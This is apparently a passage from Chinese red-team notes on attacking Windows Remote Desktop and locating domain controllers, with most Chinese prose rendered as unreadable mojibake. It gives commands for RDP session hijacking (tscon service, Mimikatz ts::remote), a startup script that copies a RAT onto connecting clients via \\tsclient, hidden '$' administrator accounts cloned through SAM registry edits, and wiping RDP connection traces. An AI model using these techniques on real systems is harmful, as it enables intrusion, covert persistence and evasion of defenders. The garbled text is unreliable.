<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc create rdpjack binpath&#x3D;&quot;cmd.exe &#x2F;k tscon 2 &#x2F;dest:console&quot;</span><br><span class="line">net start radjack # æ‰§è¡Œååˆ‡æ¢åˆ°ç›®æ ‡ç•Œé¢ä¸‹</span><br></pre></td></tr></table></figure>

<p>Mimikatzä¸­ä¹Ÿæœ‰ç›¸å…³çš„åˆ©ç”¨æ¨¡å—</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">ts::sessions</span><br><span class="line">ts::remote &#x2F;id:1</span><br><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">ts::remote &#x2F;id:1</span><br></pre></td></tr></table></figure>

<p>RDPåŠ«æŒç»å¸¸åº”ç”¨åˆ°å¦‚ä¸‹åœºæ™¯ï¼š</p>
<blockquote>
<p>ï¼ˆ1ï¼‰éœ€è¦è·å–ç›®æ ‡ç•Œé¢ä¿¡æ¯ï¼Œå¦‚ï¼šmssqlå®¢æˆ·ç«¯è¿æ¥æ•°æ®åº“</p>
<p>ï¼ˆ2ï¼‰åˆ‡æ¢åŸŸç”¨æˆ·èº«ä»½ï¼ŒåŸŸå†…ææƒã€‚å¦‚ï¼šåŸŸç®¡è´¦å·ç™»å½•åœ¨å½“å‰æœºå™¨ï¼ŒæŠ“å¯†ç çš„æ–¹å¼å‡è¢«æ‹¦æˆªå¯ä»¥è€ƒè™‘è¯¥æ–¹å¼</p>
<p>ï¼ˆ3ï¼‰ç»•è¿‡å®‰å…¨é˜²æŠ¤ã€‚å¦‚ï¼šä¹‹å‰é‡åˆ°çš„ä¸€ä¸ªå¥‡è‘©ç¯å¢ƒï¼ŒSystemæƒé™ä½¿ç”¨produmpè¢«AVæ‹¦æˆªï¼Œä½†æ˜¯åˆ‡æ¢åˆ°ç®¡ç†å‘˜æƒé™å¯ä»¥æ­£å¸¸dumpâ€¦â€¦</p>
</blockquote>
<h2 id="RDP-æœåŠ¡å™¨åæ‰“å®¢æˆ·ç«¯"><a href="#RDP-æœåŠ¡å™¨åæ‰“å®¢æˆ·ç«¯" class="headerlink" title="RDP æœåŠ¡å™¨åæ‰“å®¢æˆ·ç«¯"></a>RDP æœåŠ¡å™¨åæ‰“å®¢æˆ·ç«¯</h2><blockquote>
<p> éœ€è¦å®¢æˆ·ç«¯RDPé“¾æ¥æ—¶ï¼Œå¼€å¯ç£ç›˜å…±äº«ï¼ˆå°†æœ¬åœ°ç£ç›˜æŒ‚åœ¨åˆ°æœåŠ¡å™¨ä¸Šï¼‰æ‰èƒ½æ­£å¸¸åˆ©ç”¨</p>
</blockquote>
<p>æ‰‹åŠ¨åˆ©ç”¨è¿‡ç¨‹ï¼šå‡è®¾å®¢æˆ·ç«¯å’Œç™»å½•æœåŠ¡å™¨çš„ç”¨æˆ·éƒ½æ˜¯Administrator</p>
<p>â€‹    ï¼ˆ1ï¼‰åœ¨æœåŠ¡å™¨ç«¯è®¾ç½®Administrator å¯åŠ¨é¡¹ç›®ï¼Œ<code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\powershell.vbs</code> ä½œç”¨æ˜¯æ— å¼¹çª—æ‰§è¡Œbatè„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set ws&#x3D;WScript.CreateObject(&quot;WScript.Shell&quot;)ws.Run &quot;C:\Windows.bat&quot;,0ws.Run &quot;cmd &#x2F;c del C:\Windows\Temp\service.exe&quot;,0</span><br></pre></td></tr></table></figure>

<p>â€‹    ï¼ˆ2ï¼‰Windows.bat è„šæœ¬å†…å®¹å®ç°é©¬ï¼ˆservice.exeï¼‰æ‹·è´åˆ°å®¢æˆ·ç«¯çš„<strong>å¯åŠ¨ç›®å½•</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy &quot;C:\Windows\Temp\service.exe&quot; &quot;\\tsclient\c\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\service.exe&quot;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥æ ¹æ®å®é™…æƒ…å†µï¼Œå°†Ratæ‹·è´åˆ°å®¢æˆ·ç«¯çš„å…¶ä»–ç›®å½•ï¼Œå°†æ¿€æ´»è„šæœ¬æ‹·è´åˆ°å®¢æˆ·ç«¯å¯åŠ¨ç›®å½•ï¼›</p>
<p>å¦‚æœä¸å‡ºç½‘çš„æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä»¥å°†exeæ›¿æ¢æˆè¦æ‰§è¡Œçš„è„šæœ¬ ã€‚</p>
<p>åˆ©ç”¨å·¥å…·ï¼š<a target="_blank" rel="noopener" href="https://github.com/mdsecactivebreach/RDPInception">https://github.com/mdsecactivebreach/RDPInception</a></p>
<ol>
<li>Modify batch file to execute PowerShell stager, EXE or even DLL.</li>
<li>Upload to the target, execute.</li>
</ol>
<h2 id="å¼€å¯RDPå½±å­ç”¨æˆ·"><a href="#å¼€å¯RDPå½±å­ç”¨æˆ·" class="headerlink" title="å¼€å¯RDPå½±å­ç”¨æˆ·"></a>å¼€å¯RDPå½±å­ç”¨æˆ·</h2><p>åœ¨Windowsä¸­ï¼Œæ·»åŠ è´¦æˆ·ååé¢åŠ å…¥<code>$</code>ç¬¦åˆå¯ä»¥ä½¿è¯¥ç”¨æˆ·åœ¨å‘½ä»¤è¡Œä¸­éšè—</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622213958809.png)</p>
<p>net user æ˜¯çœ‹ä¸åˆ°çš„ï¼Œä½†æ˜¯ç¡®å®å­˜åœ¨ã€‚</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622214055156.png)</p>
<p>å°†å½±å­ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators nb666$ /add</span><br></pre></td></tr></table></figure>



<p>è¿™ç‚¹éšè—å®Œå…¨ä¸å¤Ÿï¼ŒWindowsç”¨æˆ·çš„ç™»å½•ç•Œé¢ï¼Œä¼šæ˜¾ç¤ºæ‰€æœ‰å¯ä»¥ç™»å½•çš„ç”¨æˆ·ã€‚</p>
<h3 id="å½±å­ç”¨æˆ·éšè—ç™»å½•ç•Œé¢"><a href="#å½±å­ç”¨æˆ·éšè—ç™»å½•ç•Œé¢" class="headerlink" title="å½±å­ç”¨æˆ·éšè—ç™»å½•ç•Œé¢"></a>å½±å­ç”¨æˆ·éšè—ç™»å½•ç•Œé¢</h3><p>æ–¹æ³•ï¼šæ›´æ”¹æ³¨å†Œè¡¨ï¼Œå…‹éš†è´¦å·ã€‚</p>
<p>å¯åŠ¨cmdï¼Œç„¶åè¾“å…¥<code>regedit</code>ï¼Œæ‰“å¼€æ³¨å†Œè¡¨ã€‚</p>
<p>æ‰¾åˆ° <code>HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\User</code>ï¼Œè€Œé»˜è®¤æƒ…å†µä¸‹<code>SAM</code>é”®å€¼åªèƒ½ç”±<strong>system</strong>æƒé™è¿›è¡Œä¿®æ”¹</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622215055478.png)</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622215118852.png)</p>
<p>å¯¼å‡ºæ³¨å†Œè¡¨ï¼Œå¹¶ä¿®æ”¹Få€¼</p>
<p><img src="https://hackergu.com/wp-content/uploads/2020/03/618b2d75da1ba69.png"></p>
<p><img src="https://hackergu.com/wp-content/uploads/2020/03/b870c2bf89419b0.png" alt="img"></p>
<p>ç„¶åæ›¿æ¢Få€¼ï¼Œåˆ é™¤ä¹‹å‰åˆ›å»ºçš„å½±å­ç”¨æˆ·å³å¯ã€‚</p>
<p>å…·ä½“æ“ä½œçœ‹è°·å¸ˆå‚…çš„åšå®¢ï¼š<a target="_blank" rel="noopener" href="https://hackergu.com/power-shadowuser/">https://hackergu.com/power-shadowuser/</a></p>
<p>ç”¨æˆ·å…‹éš†çš„æ³¨æ„äº‹é¡¹ï¼š</p>
<blockquote>
<p>æˆ‘ä»¬ä»¥<code>test$</code>èº«ä»½ç™»å½•ï¼Œä½†æ˜¯ç™»é™†ä¹‹åçš„èº«ä»½å´æ˜¯<code>WIN7</code>ç”¨æˆ·ï¼Œæ¡Œé¢ä¹Ÿæ˜¯<code>WIN7</code>ç”¨æˆ·çš„ï¼Œè¾¾åˆ°å…‹éš†æ•ˆæœã€‚æ‰€ä»¥ï¼Œåœ¨å®é™…æ“ä½œæ—¶ï¼Œè¦å°å¿ƒåœ¨æ¡Œé¢çš„æ“ä½œï¼Œä»¥é˜²è¢«å‘ç°ã€‚</p>
<p>è¿›è¡Œæ“ä½œçš„æ—¶å€™ï¼Œä¸è¦ä½¿ç”¨åŸŸç”¨æˆ·è¿›è¡Œæ“ä½œï¼Œè¯¥æ“ä½œåªé€‚ç”¨äºæœ¬åœ°ç”¨æˆ·ã€‚åˆ©ç”¨çš„å±€é™æ€§æ¯”è¾ƒå¤§ï¼Œåªæœ‰åœ¨ç™»å½•è¿œç¨‹æ¡Œé¢å¹¶ä¸”æƒé™è¾ƒå¤§æ—¶æ‰å¯ä»¥ç²¾ç¡®åˆ©ç”¨ã€‚</p>
</blockquote>
<h2 id="RDP-è¿æ¥ç—•è¿¹æ¸…é™¤"><a href="#RDP-è¿æ¥ç—•è¿¹æ¸…é™¤" class="headerlink" title="RDP è¿æ¥ç—•è¿¹æ¸…é™¤"></a>RDP è¿æ¥ç—•è¿¹æ¸…é™¤</h2><blockquote>
<p>åˆ©ç”¨â€è·³æ¿â€ä¸»æœºè¿æ¥è®¸å¤šå†…ç½‘IPåœ°å€çš„3389 åœ¨æ¸—é€ç»“æŸæ—¶æ¸…é™¤â€è„šå°â€ 3389è¿æ¥è®°å½•ä¹Ÿæ˜¯å¿…æ¸…é™¤é¡¹ç›®ä¹‹ä¸€</p>
</blockquote>
<p>è¿è¡Œregedit</p>
<p>æ‰¾åˆ°<code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code> è®¾ç½®ä¸ºä¸å¯æ”¹å†™ï¼Œå³ä¸ä¼šç•™è®°å½•ã€‚</p>
<p>å¦‚ä¸‹ï¼Œ</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622221409318.png)</p>
<p>è¿™é‡Œä¹Ÿå¯ä»¥å¯¼å‡ºRDPçš„è¿æ¥è®°å½•ã€‚</p>
<p>é€šè¿‡ä»¥ä¸‹å‘½ä»¤æšä¸¾æŒ‡å®šæ³¨å†Œè¡¨é¡¹ä¸‹æ‰€æœ‰çš„çš„å­é¡¹ï¼Œå³å½“å‰ç”¨æˆ·æ‰€è¿æ¥è¿‡çš„æ‰€æœ‰çš„ä¸»æœºåï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; -Name</span><br></pre></td></tr></table></figure>



<p>ç„¶åä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥è¯¢æŒ‡å®šæ³¨å†Œè¡¨é¡¹çš„æ³¨å†Œè¡¨é”®å€¼ï¼Œå³æŸ¥çœ‹è¿æ¥æ‰€ä½¿ç”¨çš„ç”¨æˆ·åï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Get-ItemProperty -Path &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\1.xxx.xxx.xxx&quot;).UsernameHint</span><br></pre></td></tr></table></figure>

<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622222847702.png)</p>
<p>å¹¶ä¸”åœ¨è¿è¡Œmstsc.exe ï¼Œè¿æ¥æ¡†ä¸­ä¹Ÿä¼šæœ‰è¿æ¥è¿‡çš„ip/åŸŸåã€‚</p>
<p>è¿™ä¸ªä¿¡æ¯å‚¨å­˜åœ¨â€œæˆ‘çš„æ–‡æ¡£â€ä¸‹çš„â€œDefault.rdpâ€æ–‡ä»¶ä¸­ï¼Œåˆ æ‰å°±å¯ä»¥äº†ã€‚</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622221553138.png)</p>
<h2 id="CVE-2019-0708-BlueKeep"><a href="#CVE-2019-0708-BlueKeep" class="headerlink" title="CVE-2019-0708(BlueKeep)"></a>CVE-2019-0708(BlueKeep)</h2><p>2019 å¹´ 5 æœˆ 14 æ—¥å¾®è½¯å®˜æ–¹å‘å¸ƒå®‰å…¨è¡¥ä¸ï¼Œä¿®å¤äº† Windows è¿œç¨‹æ¡Œé¢æœåŠ¡çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-0708ï¼‰ï¼Œè¯¥é«˜å±æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡è¿œç¨‹æ¡Œé¢ç«¯å£ 3389ï¼ŒRDP åè®®è¿›è¡Œæ”»å‡»çš„ã€‚</p>
<p>æ­¤æ¼æ´æ˜¯é¢„èº«ä»½éªŒè¯ä¸”æ— éœ€ç”¨æˆ·äº¤äº’ï¼Œè¿™å°±æ„å‘³ç€è¿™ä¸ªæ¼æ´å¯ä»¥é€šè¿‡ç½‘ç»œè •è™«çš„æ–¹å¼è¢«åˆ©ç”¨ã€‚åˆ©ç”¨æ­¤æ¼æ´çš„ä»»ä½•æ¶æ„è½¯ä»¶éƒ½å¯èƒ½ä»è¢«æ„ŸæŸ“çš„è®¡ç®—æœºä¼ æ’­åˆ°å…¶ä»–æ˜“å—æ”»å‡»çš„è®¡ç®—æœºï¼Œå…¶æ–¹å¼ä¸ 2017 å¹´ WannaCry æ¶æ„è½¯ä»¶çš„ä¼ æ’­æ–¹å¼ç±»ä¼¼ã€‚</p>
<p>å®ƒå½±å“äº†æŸäº›æ—§ç‰ˆæœ¬çš„ Windows ç³»ç»Ÿï¼ŒåŒ…æ‹¬ï¼š</p>
<blockquote>
<p>Windows 7 foR 32-bit Systems Service Pack 1</p>
<p>Windows 7 for x64-based Systems Service Pack 1</p>
<p>Windows Server 2008 foR 32-bit Systems Service Pack 2</p>
<p>Windows Server 2008 foR 32-bit Systems Service Pack 2 (Server Core installation)</p>
<p>Windows Server 2008 for Itanium-Based Systems Service Pack 2</p>
<p>Windows Server 2008 for x64-based Systems Service Pack 2</p>
<p>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)</p>
<p>Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1</p>
<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1</p>
<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</p>
<p>Windows XP SP3 x86</p>
<p>Windows XP Professional x64 Edition SP2</p>
<p>Windows XP Embedded SP3 x86</p>
<p>Windows Server 2003 SP2 x86</p>
<p>Windows Server 2003 x64 Edition SP2</p>
</blockquote>
<p>Windows 8 å’Œ Windows 10 åŠä¹‹åç‰ˆæœ¬çš„ç”¨æˆ·ä¸å—æ­¤æ¼æ´çš„å½±å“ã€‚</p>
<p><strong>å®æˆ˜è¿˜æ²¡æˆåŠŸè¿‡</strong>ã€‚</p>
<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/93496.htm">https://www.jb51.net/article/93496.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaskying/article/details/9361181">https://blog.csdn.net/seaskying/article/details/9361181</a></p>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95</a></p>
<p><a target="_blank" rel="noopener" href="https://pythonpig.github.io/2016/12/21/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9F%A5%E8%AF%86%E6%B1%87%E6%80%BB/">https://pythonpig.github.io/2016/12/21/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9F%A5%E8%AF%86%E6%B1%87%E6%80%BB/</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-server/remote/remote-desktop-services/clients/remote-desktop-supported-config">https://docs.microsoft.com/zh-cn/windows-server/remote/remote-desktop-services/clients/remote-desktop-supported-config</a></p>
<p><a target="_blank" rel="noopener" href="http://t3ngyu.leanote.com/post/LM-RDP">http://t3ngyu.leanote.com/post/LM-RDP</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mujj/articles/3065895.html">https://www.cnblogs.com/mujj/articles/3065895.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.tomshardware.com/reviews/enable-remote-desktop-in-windows-server-2016,5592.html">https://www.tomshardware.com/reviews/enable-remote-desktop-in-windows-server-2016,5592.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.yowko.com/windows-server-2016-enable-remote-desktop/#%E4%BD%BF%E7%94%A8-powershell">https://blog.yowko.com/windows-server-2016-enable-remote-desktop/#%E4%BD%BF%E7%94%A8-powershell</a></p>
<p><a target="_blank" rel="noopener" href="https://www.rootusers.com/how-to-enable-remote-desktop-in-windows-server-2019/">https://www.rootusers.com/how-to-enable-remote-desktop-in-windows-server-2019/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/06/26/windows%E6%B8%97%E9%80%8F%E4%B8%AD%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/">https://www.k0rz3n.com/2018/06/26/windows%E6%B8%97%E9%80%8F%E4%B8%AD%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/</a></p>
<p><a target="_blank" rel="noopener" href="https://hackergu.com/power-shadowuser/">https://hackergu.com/power-shadowuser/</a></p>
<p><a target="_blank" rel="noopener" href="http://www.91ri.org/2234.html">http://www.91ri.org/2234.html</a></p>
<h1 id="åŸŸå¤–å¯»æ‰¾åŸŸæ§æ€è·¯"><a href="#åŸŸå¤–å¯»æ‰¾åŸŸæ§æ€è·¯" class="headerlink" title="åŸŸå¤–å¯»æ‰¾åŸŸæ§æ€è·¯"></a>åŸŸå¤–å¯»æ‰¾åŸŸæ§æ€è·¯</h1><h2 id="æ‰«æå†…ç½‘ä¸­åŒæ—¶å¼€æ”¾389å’Œ53ç«¯å£çš„æœºå™¨"><a href="#æ‰«æå†…ç½‘ä¸­åŒæ—¶å¼€æ”¾389å’Œ53ç«¯å£çš„æœºå™¨" class="headerlink" title="æ‰«æå†…ç½‘ä¸­åŒæ—¶å¼€æ”¾389å’Œ53ç«¯å£çš„æœºå™¨"></a>æ‰«æå†…ç½‘ä¸­åŒæ—¶å¼€æ”¾389å’Œ53ç«¯å£çš„æœºå™¨</h2><p>ç«¯å£ï¼š389<br>æœåŠ¡ï¼šLDAPã€ILS<br>è¯´æ˜ï¼šè½»å‹ç›®å½•è®¿é—®åè®®å’ŒNetMeeting Internet Locator Serverå…±ç”¨è¿™ä¸€ç«¯å£ã€‚</p>
<p>ç«¯å£ï¼š53<br>æœåŠ¡ï¼šDomain Name Serverï¼ˆDNSï¼‰<br>è¯´æ˜ï¼š53ç«¯å£ä¸ºDNS(Domain Name Serverï¼ŒåŸŸåæœåŠ¡å™¨)æœåŠ¡å™¨æ‰€å¼€æ”¾ï¼Œä¸»è¦ç”¨äºåŸŸåè§£æï¼ŒDNSæœåŠ¡åœ¨NTç³»ç»Ÿä¸­ä½¿ç”¨çš„æœ€ä¸ºå¹¿æ³›ã€‚é€šè¿‡DNSæœåŠ¡å™¨å¯ä»¥å®ç°åŸŸåä¸IPåœ°å€ä¹‹é—´çš„è½¬æ¢ï¼Œåªè¦è®°ä½åŸŸåå°±å¯ä»¥å¿«é€Ÿè®¿é—®ç½‘ç«™ã€‚</p>
<h1 id="åŸŸå¤–å¦‚ä½•æ‰“åŸŸæ§"><a href="#åŸŸå¤–å¦‚ä½•æ‰“åŸŸæ§" class="headerlink" title="åŸŸå¤–å¦‚ä½•æ‰“åŸŸæ§"></a>åŸŸå¤–å¦‚ä½•æ‰“åŸŸæ§</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/88786465">https://zhuanlan.zhihu.com/p/88786465</a></p>
<p>Responder æŠ“åˆ°ä¸€å°åŸŸå†…æœºå™¨çš„Net-NTLM v2 Hash ï¼ŒCME æ£€æŸ¥NetBIOSï¼Œç¡®å®šæ˜¯å¦å’Œç”¨æˆ·å¯¹åº”ï¼Œhashcat ç ´è§£Net-NTLM v2 Hashï¼Œè·å–åˆ° SAM æ–‡ä»¶å­˜å‚¨çš„NTLM Hashï¼Œpth &amp; psexecã€‚</p>
<p><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec/releases">https://github.com/byt3bl33d3r/CrackMapExec/releases</a></p>
<h1 id="åŸŸå†…å¯»æ‰¾åŸŸæ§æ€è·¯"><a href="#åŸŸå†…å¯»æ‰¾åŸŸæ§æ€è·¯" class="headerlink" title="åŸŸå†…å¯»æ‰¾åŸŸæ§æ€è·¯"></a>åŸŸå†…å¯»æ‰¾åŸŸæ§æ€è·¯</h1><h2 id="å¸¸è§çš„å‘½ä»¤"><a href="#å¸¸è§çš„å‘½ä»¤" class="headerlink" title="å¸¸è§çš„å‘½ä»¤"></a>å¸¸è§çš„å‘½ä»¤</h2><ul>
<li>net group</li>
</ul>
<p>net group â€œdomain controllersâ€ /domain</p>
<ul>
<li>nltest</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest &#x2F;dclist:DOMAIN_NAME</span><br></pre></td></tr></table></figure>

<ul>
<li>net time /domain</li>
</ul>
<h2 id="æŸ¥è¯¢dnsè§£æè®°å½•"><a href="#æŸ¥è¯¢dnsè§£æè®°å½•" class="headerlink" title="æŸ¥è¯¢dnsè§£æè®°å½•"></a>æŸ¥è¯¢dnsè§£æè®°å½•</h2><p>è‹¥å½“å‰ä¸»æœºçš„dnsä¸ºåŸŸå†…dnsï¼Œå¯é€šè¿‡æŸ¥è¯¢dnsè§£æè®°å½•å®šä½åŸŸæ§ã€‚</p>
<p>DOMAIN_NAME ä¸º å·²çŸ¥çš„åŸŸåã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type&#x3D;all _ldap._tcp.dc._msdcs.DOMAIN_NAME</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">set type&#x3D;all</span><br><span class="line">ldap.tcp.dc._msdcs.DOMAIN_NAME</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">set type&#x3D;all</span><br><span class="line">_msdcs.DOMAIN_NAME</span><br></pre></td></tr></table></figure>

<p>åŸç†ï¼šåŸŸæ§æœåŠ¡å™¨ä¼šå‘DNSæœåŠ¡å™¨æ³¨å†ŒDNSè®°å½•ï¼Œä»¥ä¾¿å½“å®¢æˆ·ç«¯éœ€è¦åŠ å…¥åŸŸæˆ–è€…å’ŒåŸŸæœ‰å…¶ä»–äº¤äº’çš„æ—¶å€™ï¼Œå¯ä»¥æ‰¾åˆ°å®ƒã€‚</p>
<p><strong>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨nslookupçš„æ—¶å€™ï¼ŒDNSæœåŠ¡å™¨å¿…é¡»æ˜¯å†…éƒ¨DNSï¼Œå¦è€…æ˜¯æŸ¥è¯¢ä¸åˆ°è®°å½•çš„ï¼Œå› ä¸ºåŸŸæ§æœåŠ¡å™¨åªä¼šå‘å†…éƒ¨DNSæœåŠ¡å™¨æ³¨å†Œè¿™ä¸ªè®°å½•ã€‚</strong></p>
<blockquote>
<p>å¤§å¤šæƒ…å†µä¸‹ï¼Œå†…éƒ¨DNSæœåŠ¡å™¨å’ŒADåŸŸæ§æœåŠ¡å™¨é»˜è®¤éƒ¨ç½²åœ¨åŒä¸€å°æœåŠ¡å™¨ã€‚å¦‚æœæ˜¯è¿™ç§æƒ…å†µï¼Œæ‰¾åˆ°DNSæœåŠ¡å™¨å°±èƒ½æ‰¾åˆ°äº†åŸŸæ§æœåŠ¡å™¨ã€‚</p>
</blockquote>
<h2 id="SPN-æ‰«æ"><a href="#SPN-æ‰«æ" class="headerlink" title="SPN æ‰«æ"></a>SPN æ‰«æ</h2><p>å¤§éƒ¨åˆ†winç³»ç»Ÿé»˜è®¤å·²è‡ªå¸¦spnæ¢æµ‹å·¥å…·å³ï¼š<code>setspn.exe</code></p>
<p>æ­¤æ“ä½œæ— éœ€ç®¡ç†æƒé™</p>
<p>åŸŸå†…æœºå™¨æ‰§è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T target.com -Q *&#x2F;*</span><br></pre></td></tr></table></figure>

<h2 id="AdFind-exe"><a href="#AdFind-exe" class="headerlink" title="AdFind.exe"></a>AdFind.exe</h2><p>åˆ—å‡ºåŸŸæ§åˆ¶å™¨åç§°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc dclist</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢å½“å‰åŸŸä¸­åœ¨çº¿çš„è®¡ç®—æœºï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc computers_active</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢å½“å‰åŸŸä¸­åœ¨çº¿çš„è®¡ç®—æœº(åªæ˜¾ç¤ºåç§°å’Œæ“ä½œç³»ç»Ÿ)ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc computers_active name operatingSystem</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢å½“å‰åŸŸä¸­æ‰€æœ‰è®¡ç®—æœºï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -f &quot;objectcategory&#x3D;computer&quot;</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢å½“å‰åŸŸä¸­æ‰€æœ‰è®¡ç®—æœº(åªæ˜¾ç¤ºåç§°å’Œæ“ä½œç³»ç»Ÿ)ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -f &quot;objectcategory&#x3D;computer&quot; name operatingSystem</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -users name</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢æ‰€æœ‰GPOï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc gpodmp</span><br></pre></td></tr></table></figure>



<p>ADSearch ä¹Ÿå¯ä»¥ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://github.com/tomcarver16/ADSearch">https://github.com/tomcarver16/ADSearch</a></p>
